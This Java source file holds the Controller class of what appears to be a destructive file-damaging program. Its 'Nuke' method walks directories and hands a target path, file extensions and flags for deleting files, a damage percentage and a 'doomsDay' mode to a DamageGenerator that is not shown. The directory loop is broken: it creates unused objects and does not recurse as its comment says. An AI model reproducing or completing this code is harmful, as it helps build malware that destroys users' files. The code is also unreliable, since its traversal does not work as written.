package com;

import java.io.File;

public class Controller {
	private static File startpathFile;
	private static int damage, percent;
	private static String extensions[];
	private static boolean doomsDay = false;
	private static boolean random = false;
	private static boolean delete = false;
	private static boolean folders = false;

	// String start
	public Controller(String path, int damage, String[] extensions, boolean random, boolean delete, int percent, boolean folders, boolean dday) {
		Controller.startpathFile = new File(path);
		Controller.damage = damage;
		Controller.extensions = extensions;
		Controller.doomsDay = dday;
		Controller.random = random;
		Controller.delete = delete;
		Controller.percent = percent;
		Controller.folders = folders;

	}

	// File Start
	public Controller(File path, int damage, String[] extensions, boolean random, boolean delete, int percent, boolean folders, boolean dday) {
		Controller.startpathFile = path;
		Controller.damage = damage;
		Controller.extensions = extensions;
		Controller.doomsDay = dday;
		Controller.random = random;
		Controller.delete = delete;
		Controller.percent = percent;
		Controller.folders = folders;
		
	}

	public void Nuke() {
		File[] listFolders = new DirectoryScanner(startpathFile).Directories();

		// for cycle to walk around all directories
		for (int i = 0; i < listFolders.length; i++) {
			// search for other paths\
			new Controller(startpathFile, damage, extensions, random, delete, percent, folders, doomsDay);
		}
		// NUKE this path last to save the program time
		// System.out.println(startingPath+"\t\tflooded");
		new DamageGenerator(damage, startpathFile, extensions, random, percent, delete, folders, doomsDay).DoDamage();;

	}
}
